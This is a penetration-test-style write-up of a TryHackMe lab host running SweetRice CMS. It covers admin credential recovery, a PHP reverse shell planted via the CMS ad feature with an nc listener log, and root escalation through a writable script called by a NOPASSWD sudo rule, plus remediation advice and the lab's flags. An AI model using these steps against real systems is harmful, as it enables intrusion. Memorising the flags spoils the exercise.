
# Professional Penetration Test Report — SweetRice CMS (THM Lab)

> **Note:** This report documents testing performed against a TryHackMe lab host (`10.201.35.101`). This activity was performed in a controlled/consented CTF environment. Do **not** apply these techniques against systems you do not own or have explicit authorization to test.

---

## Title Blurb
- **Report Title:** Internal Penetration Test Report — SweetRice CMS (THM)
- **Client:** TryHackMe (lab environment)
- **Test Team / Company:** 0xBlood
- **Report Date:** 2025-11-05
- **Assessment Dates:** 2025-11-04 (exploit and escalation completed)
- **Confidentiality:** This document is confidential and intended for authorized recipients only.

---

## Revision History
| Version | Date | Author | Summary of changes |
|---|---:|---|---|
| 0.1 | 2025-11-05 | 0xBlood | Initial report — findings, PoCs, remediation |

---

## Table of Contents
1. Executive Summary  
2. Scope & Objectives  
3. Summary of Findings  
4. Risk Rating Methodology  
5. Technical Findings & Evidence  
6. Remediation Recommendations  
7. Retest & Validation  
8. Methodology & Tools  
9. Assumptions, Limitations & Exclusions  
10. Legal & Compliance Considerations  
11. Appendices

---

## 1. Executive Summary
- **Purpose:** Verify the security posture of a lab web host running SweetRice CMS and demonstrate risk from common CMS and configuration weaknesses.
- **Scope Overview:** Single target host: `10.201.35.101` (internal IP). Services discovered: HTTP (Apache/2.4.18) and SSH (OpenSSH 7.2p2).
- **Summary of Results:** Full compromise achieved. We obtained an unauthenticated-to-authenticated web admin path via leaked credentials, exploited an RCE vector (admin-controlled ad content executing PHP), gained a `www-data` shell, performed local enumeration and abused an overly-permissive NOPASSWD sudo entry to escalate to root.
- **Impact Statement:** An attacker could achieve full system compromise (execute arbitrary code as webserver user and escalate to root), exfiltrate sensitive data, and persist access.
- **Top Recommendations (high-level):**
  1. Remove or correct NOPASSWD sudo entries that call scripts which reference user-writable files.
  2. Patch or remove vulnerable SweetRice CMS (or isolate and sandbox it); disallow execution of user-supplied content.
  3. Harden file permissions (ensure `/etc` scripts are root-owned and not world/writable) and implement file-integrity monitoring.

---

## 2. Scope & Objectives
- **In-Scope Targets:**  
  - `10.201.35.101` — Apache web server hosting SweetRice CMS under `/content/`  
- **Out-of-Scope Targets:** All other internal/adjacent networks not specified above.
- **Test Types:** Internal / Web application exploitation and local privilege escalation (lab/CTF).
- **Objectives:**  
  1. Identify web application vulnerabilities enabling code execution.  
  2. Obtain user-level access and escalate to root.  
- **Testing Window & Constraints:** Single-session lab exercise on 2025-11-04. No social engineering or physical testing performed.

---

## 3. Summary of Findings (Executive Table)

| Finding ID | Title | Risk | Affected Asset(s) | Status |
|---|---|---:|---|---|
| F-001 | Remote Code Execution via SweetRice CMS (admin content execution) | Critical | `http://10.201.35.101/content/` (SweetRice v1.5.1) | Open |
| F-002 | Privilege Escalation — NOPASSWD sudo for Perl script calling writable `/etc/copy.sh` | Critical | Host: `10.201.35.101` — `/usr/bin/perl /home/itguy/backup.pl` (sudoers) | Open |
| F-003 | Unnecessary exposure of SSH (service present) | Info | `10.201.35.101` (OpenSSH 7.2p2) | Informational |

**Counts:** Critical: 2, High: 0, Medium: 0, Low: 0, Info: 1

---

## 4. Risk Rating Methodology
- Severity is categorized: Critical / High / Medium / Low / Informational.
- Ratings consider exploitability (ease to exploit), impact (data loss/privilege gained), and exposure (internet-facing vs internal).
- For RCE combined with local privilege escalation, severity = **Critical**.

---

## 5. Technical Findings & Evidence

### Finding F-001 — Remote Code Execution via SweetRice CMS
- **Risk:** Critical
- **Affected Asset(s):** `http://10.201.35.101/content/` (SweetRice CMS v1.5.1)
- **Finding Summary:** SweetRice CMS installation allowed admin-created content to be saved and interpreted as PHP, enabling remote code execution when a crafted ad was viewed.
- **Impact:** An authenticated attacker (or compromised admin account) can execute arbitrary PHP, leading to arbitrary code execution as the web server user (`www-data`) and full system compromise when combined with local weaknesses.
- **Likelihood:** High (vulnerable version recorded and easy to exploit with admin access).
- **Technical Detail / Evidence (commands & output):**

**Baseline scan**
```bash
# nmap baseline scan
nmap -sV -sT 10.201.35.101
# excerpt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

**Directory discovery (gobuster):**
```bash
$ gobuster dir -u http://10.201.35.101/ -w /usr/share/wordlists/dirb/common.txt
Found: /content/ (301)
```

**CMS version found:**
```
/content/inc/latest.txt  -> SweetRice version 1.5.1
```

**Credentials discovered (from backup/mysql file):**
```
admin -> manager
passwd -> 42f749ade7f9e195bf475f37a44cafcb  # MD5
# MD5 reversed -> Password123
```

**Admin access:**
- Logged in to `http://10.201.35.101/content/as/` using `manager:Password123`.

**Reverse shell creation and trigger:**
- Placed PHP reverse shell code (Pentestmonkey php-reverse-shell) into an ad that the CMS saved to `/content/inc/ads/shell.php`.
- Listener on attacker:
```bash
nc -lvnp 8080
# Received:
Connection received on 10.201.35.101 55966
Linux THM-Chal 4.15.0-70-generic ... i686
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

- **Proof of Concept:** Viewing `http://10.201.35.101/content/inc/ads/shell.php` triggered the reverse shell, giving `www-data` code execution.

- **Remediation & Mitigation:**
  - Patch or upgrade SweetRice CMS to a non-vulnerable release.
  - Ensure files created by CMS are not written into executable webroot with PHP parsing enabled (store uploads outside webroot or serve them as static content).
  - Implement input sanitization and restrict admin content to non-executable formats.
  - Restrict admin interface with strong passwords and multi-factor authentication.

- **References:**
  - Pentestmonkey php-reverse-shell PoC used as payload.
  - Public advisories for SweetRice CMS v1.5.1 (exploit-db entries for RCE/LFI/CSRF).

---

### Finding F-002 — Privilege Escalation via Sudo NOPASSWD calling writable script
- **Risk:** Critical
- **Affected Asset(s):** Host `10.201.35.101` — sudoers entry for `www-data`
- **Finding Summary:** `www-data` is allowed to execute `/usr/bin/perl /home/itguy/backup.pl` as root without password; `backup.pl` calls `/etc/copy.sh`. `/etc/copy.sh` was writable and could be replaced to spawn a root shell.
- **Impact:** Allows immediate root escalation from webshell / `www-data`.
- **Likelihood:** High (sudo misconfiguration discovered during enumeration).
- **Technical Detail / Evidence:**

**Sudo enumeration as `www-data`:**
```bash
www-data@THM-Chal:/home/itguy$ sudo -l
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

**Backup script contents:**
```perl
# /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

**Writable copy script:**
- `/etc/copy.sh` writable by `www-data` (lab config), contents replaced with:
```bash
/bin/bash
```

**Abuse to obtain root:**
```bash
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
root@THM-Chal:/home/itguy# whoami
root
```


- **Remediation & Mitigation:**
  - Remove or restrict the NOPASSWD sudo rule. Avoid permitting script execution via NOPASSWD that references editable files.
  - Ensure scripts in system locations (`/etc/*`) are root-owned and not writable by non-privileged users.
  - Use least-privilege: specify full command paths and arguments in sudoers if necessary; avoid broad `ALL` perms.
  - Introduce sudo logging and alerting for unexpected use.

---

### Finding F-003 — Unnecessary exposure of SSH (Informational)
- **Risk:** Informational
- **Affected Asset(s):** `10.201.35.101` (OpenSSH 7.2p2)
- **Summary:** SSH service is present. While not exploited in this test, ensure SSH access is restricted and patched.
- **Mitigation:** Confirm strong authentication controls (keys, disable password auth if appropriate), restrict source IPs using firewall rules.

---

## 6. Remediation Roadmap (Prioritized)

**Immediate (within 1 week)**  
- Remove or reconfigure the `NOPASSWD` sudo entry for `/usr/bin/perl /home/itguy/backup.pl`. If necessary to keep, ensure `/etc/copy.sh` is root-owned and immutable.  
- Patch or take SweetRice CMS offline until upgraded.

**Short-term (1–3 months)**  
- Reconfigure CMS to prevent execution of admin-supplied PHP; move uploads outside webroot or enforce strict content-type handling.  
- Harden file permissions across `/etc` and application directories.

**Medium-term (3–6 months)**  
- Implement role-based access on admin panels and enable MFA for admin accounts.  
- Deploy file integrity monitoring and alerts for unexpected changes to scripts and web directories.

**Long-term**  
- Review sudoers policy across systems: minimize NOPASSWD usage, adopt just-in-time escalation or centralized privileged access management.

---

## 7. Retest & Validation
- **Retest Scope:** F-001 and F-002 must be retested after fixes.  
- **Validation Steps:**  
  - Confirm CMS upgrade and that admin-created content cannot create executable PHP files in webroot. Attempt previous PoC upload to verify prevention.  
  - Confirm sudoers no longer allows `www-data` to run the perl script without password or that `/etc/copy.sh` is protected and cannot be modified by `www-data`. Attempt to reproduce privilege escalation steps to verify remediation.

---

## 8. Methodology & Tools
- **Methodology:** Targeted web application enumeration, exploit PoC creation, local privilege escalation through standard Linux enumeration techniques.
- **Tools Used:**  
  - nmap 7.80 (service enumeration)  
  - gobuster 3.6 (directory enumeration)  
  - netcat (nc) — reverse shell listener  
  - telnet / curl / browser — banner checks and HTTP verification  
  - Python (pty) — shell stabilization  
  - manual inspection (cat/ls/sudo -l)  
- **Custom Payloads / References:** Pentestmonkey php-reverse-shell used for PoC.

---

## 9. Assumptions, Limitations & Exclusions
- **Assumptions:** This is a lab/CTF environment configured for exploitation; file permissions and accounts may differ from production systems.  
- **Limitations:** Testing was limited to this host and web-application attack surface; no social engineering, lateral movement beyond scope, or persistence techniques performed.  
- **Exclusions:** No destructive commands were executed beyond script modifications required to demonstrate escalation (in-lab).

---

## 10. Legal & Compliance Considerations
- **Rules of Engagement:** Testing conducted against a TryHackMe lab with permission for adversarial activity. If these findings apply to production systems, follow responsible disclosure and patching procedures.  
- **Data Handling:** Flags and CTF artifacts included in this report for validation. Sanitize any real-world customer data before sharing this report outside authorized recipients.

---

## 11. Appendices

### Appendix A — Full Tool Output (selected excerpts)
**Nmap output (excerpt):**
```
nmap -sV -sT 10.201.35.101
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

**Gobuster excerpts:**
```
/content             (Status: 301) [--> http://10.201.35.101/content/]
/content/as/         (Status: 301) [--> http://10.201.35.101/content/as/]  # admin UI
/content/inc/        (Status: 301) [--> http://10.201.35.101/content/inc/]  # includes
```

**Reverse shell listener log:**
```
nc -lvnp 8080
Connection received on 10.201.35.101 55966
Linux THM-Chal 4.15.0-70-generic ... i686
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Sudo listing as www-data:**
```
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

**backup.pl content:**
```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

**/etc/copy.sh (modified for PoC):**
```
/bin/bash
```

**Flags (spoiler):**
- User flag: `THM{63e5bce9271952aad1113b6f1ac28a07}`
- Root flag: `THM{6637f41d0177b6f37cb20d775124699f}`

> _Note:_ Flags included for CTF validation. For real engagements, mask or remove sensitive artifacts.

### Appendix B — Evidence & Screenshots
- Reverse shell actions, CMS screenshot (ad editor with PHP payload), and command outputs were captured during testing. Keep these artifacts in secure storage if needed for audits or retests.

### Appendix C — Suggested Validation Checklist (for remediation)
1. Confirm CMS patched/removed or admin uploads sanitized.  
2. Run same upload PoC — file should not execute as PHP.  
3. Remove NOPASSWD entry or secure referenced files. Attempt the same `sudo` sequence to confirm failure.  
4. Ensure `/etc/copy.sh` (or similar scripts) are owned by root and not writable by unprivileged users.

---

## Final Notes & Legal Disclaimer
This report documents offensive actions performed in a controlled CTF environment. The techniques and PoCs provided are for educational and defensive remediation purposes only. Unauthorized use of these techniques against production or third-party systems is illegal and unethical.

